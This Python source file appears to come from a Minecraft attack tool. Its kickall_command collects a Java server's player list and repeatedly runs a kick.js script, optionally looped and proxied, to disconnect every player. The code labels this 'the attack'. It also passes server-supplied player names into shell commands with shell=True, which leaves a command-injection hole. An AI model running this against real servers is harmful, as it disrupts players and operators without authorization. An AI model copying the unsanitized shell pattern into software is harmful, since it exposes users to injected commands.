import subprocess
import time

from src.decoration.paint import paint
from src.minecraft.get_minecraft_server_data import GetMinecraftServerData
from src.managers.json_manager import JsonManager
from src.utilities.get_utilities import GetUtilities
from src.utilities.check_utilities import CheckUtilities


def kickall_command(server, version, loop, *args):
    """
    Connects to the specified Minecraft server and disconnects all players.

    Args:
        server (str): The IP address or domain of the server.
        version (str): The Minecraft version to use for the connection.
        loop (bool): A flag to indicate whether the attack should run in a loop.
        *args: Additional arguments (not used in this function).
    """

    try:
        if not CheckUtilities.check_loop_argument(loop):
            # Check if the 'loop' argument is valid, display an error if not.
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "invalidArguments", "invalidLoopArgument"])}')
            return
        
        loop = GetUtilities.get_loop_argument(loop)
        
        # Get information about the specified Minecraft server.
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "gettingDataFromServer"])}')
        server_data = GetMinecraftServerData.get_data(server, bot=False)

        if server_data is None:
            # Display an error message if the server information cannot be retrieved
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "invalidArguments", "invalidServer"])}')
            return
        
        if server_data['platform_type'] != 'Java':
            # Display an error message if the server is Bedrock.
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "errorBedrockServer"])}')
            return
        
        players = []

        # Extract the server IP address and port from the server data.
        server = server_data['ip_port']
        ip, port = server.split(':')

        if server_data['default_player_list'] is not None and len(server_data['default_player_list']) >= 1:
            for player in server_data['default_player_list']:
                if type(player) == dict:
                    if player['name'] != 'Anonymous Player':
                        players.append(player['name'])
                else:
                    # Display an error message if player information is not in the expected format.
                    paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "kickall", "noPlayers"])}')
                    return
        else:
            # Display an error message if no players are found on the server.
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "kickall", "noPlayers"])}')
            return
        
        if len(players) == 0:
            # Display an error message if no players are found on the server.
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "kickall", "noPlayers"])}')
            return

        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "kickall", "startingTheAttack"])}')
        
        if loop:
            while loop:
                time.sleep(1)
                
                for player in players:
                    # Construct and execute the command to kick each player.
                    if JsonManager.get(["minecraftServerOptions", "proxy"]):
                        command = f'{JsonManager.get(["minecraftServerOptions", "nodeCommand"])} ./mcptool_files/scripts/kick.js {ip} {port} {player} {version} {len(GetUtilities.get_spaces())} {JsonManager.get(["minecraftServerOptions", "proxyFileForTheBot"])}'

                    else:
                        command = f'{JsonManager.get(["minecraftServerOptions", "nodeCommand"])} ./mcptool_files/scripts/kick.js {ip} {port} {player} {version} {len(GetUtilities.get_spaces())}'
                    
                    subprocess.run(command, shell=True)

        if not loop:
            for player in players:
                # Construct and execute the command to kick each player.
                if JsonManager.get(["minecraftServerOptions", "proxy"]):
                    command = f'{JsonManager.get(["minecraftServerOptions", "nodeCommand"])} ./mcptool_files/scripts/kick.js {ip} {port} {player} {version} {len(GetUtilities.get_spaces())} {JsonManager.get(["minecraftServerOptions", "proxyFileForTheBot"])}'

                else:
                    command = f'{JsonManager.get(["minecraftServerOptions", "nodeCommand"])} ./mcptool_files/scripts/kick.js {ip} {port} {player} {version} {len(GetUtilities.get_spaces())}'
                
                subprocess.run(command, shell=True)

    except KeyboardInterrupt:
        # Handle keyboard interruption gracefully.
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["commands", "ctrlC"])}')
